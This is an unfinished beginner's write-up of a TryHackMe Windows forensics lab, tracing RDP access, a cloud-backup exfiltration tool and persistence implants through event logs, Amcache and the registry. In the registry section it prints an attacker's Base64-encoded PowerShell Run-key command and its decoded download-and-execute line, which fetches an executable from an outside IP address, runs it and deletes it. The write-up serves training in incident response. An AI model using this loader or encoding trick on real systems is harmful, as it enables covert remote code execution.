# Blizzard
**Description:** A critical alert was triggered from a sensitive server. You are tasked to perform a live investigation on multiple machines to determine the root cause of the incident.  
**Difficulty:** Medium  
**Link:** https://tryhackme.com/r/room/blizzard

## Task 1: Introduction: Analysing the Impact

Disclaimer: This is my first ever write-up and I am not an expert in the field of Windows forensics. While the answers are factually correct, there might be much more efficient ways to obtain them.

>When did the attacker access this machine from another internal machine? (format: MM/DD/YYYY HH:MM:SS)

We could probably answer this using the native Windows Event Viewer (`eventvwr.msc`), but let's instead make use of the tools provided in the room. First we run [Eric Zimmerman's](https://ericzimmerman.github.io/#!index.md) event log parser EvtxECmd.

```
C:\Tools\EvtxECmd\EvtxECmd.exe -f C:\Windows\System32\winevt\Logs\Security.evtx --inc 4624,4625 --csv .
```

![screenshot1](/Blizzard/assets/screenshot1.png)

We command the tool to read in the security log file at `C:\Windows\System32\winevt\Logs\Security.evtx`, exctract successful (Event ID 4624) and failed (4625) logons and write the data to a CSV file in the current folder.

![screenshot2](/Blizzard/assets/screenshot2.png)

Now we can finally have a look at the logs by opening the output file in Timeline Explorer (shortcut on the desktop). Scrolling through the data we notice the `Remote Host` column, which in some rows contains IP addresses. Before wasting any time manually going through a thousand rows of logs, we can use the task description to greatly narrow down our search:

>The IT team has also shared that the infected database server is set up for internal access only and is not yet linked to other systems

We can figure out which network the machine is connected to using ipconfig

![screenshot3](/Blizzard/assets/screenshot3.png)

Here some basic networking knowledge helps. An IPv4 address of `10.10.211.166` with a `255.255.0.0` subnet mask means we are on the `10.10.0.0/16` network, in other words: All hosts on the same, internal, network must start with `10.10.`.

By clicking below the `Remote Host` column heading in Timeline Explorer we create a filter `contains 10.10.` We also know from the task description that the data exfiltration was detected at time `03/24/2024 19:55:29`, so we can add another filter for the `Time Created` column, displaying only logs from the same day.

We have now narrowed it down to 146 rows of data. Ordering them by `Time Created`, adjusting the columns to display only relevant data, and focussing on the rows immediately before the incident was detected, we notice a logon `Type 3` for user `dbadmin` followed by a logon `Type 10` one second later. Some googling later I knew that `Type 3` stands for `Network` while `Type 10` denotes `RemoteInteractive` logons, most likely RDP ([Microsoft Docs](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc787567(v=ws.10))). 

![screenshot4](/Blizzard/assets/screenshot4.png)

Full disclosure: I still don't fully understand what is going on here, why there is one succesful `Type 3` logon at second `01` followed by an identical one less than a minute later and then ultimately a `Type 10`. As far as flags are concerned, I tried each of the three timestamps and then did some googling in an attempt to understand the correct answer. [One article I found](https://frsecure.com/blog/rdp-connection-event-logs/) points to event ID 1149 in the `TerminalServices-RemoteConnectionManager/Operational` log specifically for successful RDP logons. I wanted to confirm that, so I ran EvtxECmd again:

```
C:\Tools\EvtxECmd\EvtxECmd.exe -f C:\Windows\System32\winevt\Logs\Microsoft-Windows-TerminalServices-RemoteConnectionManager%4Operational.evtx --inc 1149 --csv .
```
![screenshot5](/Blizzard/assets/screenshot5.png)

Opened in Timeline Explorer we only have a couple of rows, with precisely one containing `dbadmin` and a `10.10.0.0/16` remote host. Probably not the cleanest method, but this timestamp, which matches the redacted one in the security event log above, is the one we are looking for.

![screenshot6](/Blizzard/assets/screenshot6.png)

>What is the full file path of the binary used by the attacker to exfiltrate data?

Amcache is a Windows artifact that among other things, stores information on executables that were executed on a system. Another one of Zimmerman's tools, AppCompatCacheParser, pulls the data for us and hands us a CSV file to work with.

```
C:\Tools\AppCompatCacheParser\AppCompatCacheParser.exe --csv .
```

![screenshot7](/Blizzard/assets/screenshot7.png)

Once we've opened the file in Timeline Explorer, filterer for `Executed=Yes`, sorted by `Cache Entry Position`, and arranged the columns for better visibility, we find the local PostgreSQL database [has been backed up](https://www.postgresql.org/docs/current/app-pgdump.html), followed by the execution of `######.exe` from `dbadmin`'s home directory.

![screenshot8](/Blizzard/assets/screenshot8.png)

If the name doesn't give it away already, let's Google the thing to be safe:

![screenshot9](/Blizzard/assets/screenshot9.png)

We found the culprit, next question.

>What email is used by the attacker to exfiltrate sensitive data?

This is probably part of the configuration data for the cloud backup tool found in the previous question. After a quick web search we are looking for `######.conf`. With the power of PowerShell:

```
Get-ChildItem -Path C:\Users\*######* -Force -Recurse -ErrorAction SilentlyContinue
```
we quickly find the file

![screenshot10](/Blizzard/assets/screenshot10.png)

and reveal its content

![screenshot11](/Blizzard/assets/screenshot11.png)

>Where did the attacker store a persistent implant in the registry? Provide the registry value name.

Two [keys contain programs](https://learn.microsoft.com/pl-pl/windows/win32/setupapi/run-and-runonce-registry-keys) that run every time a user logs on:

* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

The file for the former is located at `C:\Windows\System32\config\SOFTWARE`, for the latter at `C:\Users\<USER>\NTUSER.DAT`. But we don't need to look for these files, which in a live system are locked by the OS, manually, since `Registry Explorer` imports them at the click of a button.

![screenshot12](/Blizzard/assets/screenshot12.png)

There we have it, this

![screenshot13](/Blizzard/assets/screenshot13.png)

```
powershell.exe -enc aQB3AHIAIAAtAHUAcwBlAGIAIABoAHQAdABwADoALwAvADEAMgA4AC4AMQA5ADkALgAyADQANwAuADEANwAzAC8AYwBvAG4AZgBpAGcAdQByAGUALgBlAHgAZQAgAC0AbwB1AHQAZgBpAGwAZQAgACQAZQBuAHYAOgBhAHAAcABkAGEAdABhAFwAYwBvAG4AZgBpAGcAdQByAGUALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAZQBuAHYAOgBhAHAAcABkAGEAdABhAFwAYwBvAG4AZgBpAGcAdQByAGUALgBlAHgAZQA7ACAAcgBtACAAJABlAG4AdgA6AGEAcABwAGQAYQB0AGEAXABjAG8AbgBmAGkAZwB1AHIAZQAuAGUAeABlAA==
```
is run every time a user logs in. The key's `Value Name` is the flag. The task doesn't ask for it, but the `-enc` option lets you feed Powershell with Base64 (crucial for decoding: using the UTF-16LE character set) encoded commands. This can be used in an attempt to evade detection as seen here. The decoded command

```
iwr -useb http://128.199.247.173/configure.exe -outfile $env:appdata\configure.exe; Start-Process $env:appdata\configure.exe; rm $env:appdata\configure.exe
```
downloads `configure.exe` from a remote host, executes it, and then deletes it again.

>Aside from the registry implant, another persistent implant is stored within the machine. When did the attacker implant the alternative backdoor? (format: MM/DD/YYYY HH:MM:SS)

I am sure there is a more efficient way (that's probably true for other things I did, as I'm new to Windows forensics), but after having ruled out Scheduled Tasks, I adapted a Powershell script from [another THM room](https://tryhackme.com/r/room/windowsapplications) to enumerate services

```powershell
$services = Get-Service | Where-Object {$_.StartType -eq "Automatic"}
foreach ($service in $services) {                                                        
    $serviceName = $service.Name                                                           
    $serviceWMI = (Get-WmiObject Win32_Service | Where-Object { $_.Name -eq $serviceName})      
    $servicePath = $serviceWMI.PathName
    Write-Host "Service Name: $serviceName"
    Write-Host "Executable Path: $servicePath"
    Write-Host "--------------------"
}
```
The code first retrieves all services that are configure to start automatically when the system starts, then prints relevant information on the screen for me to manually filter. The output only being a couple of dozen lines long, one service immediately stood out while the script was still running

![screenshot14](/Blizzard/assets/screenshot14.png)

Having found `CDPUserSvc_9286x` I now simply loaded the `SYSTEM` registry hive into Registry Explorer and searched for the service name.

![screenshot15](/Blizzard/assets/screenshot15.png)

Both search results come with identical `Last write` timestamps. That is when the service was created and with that, the answer to the last question of task 1.

Work in progress...
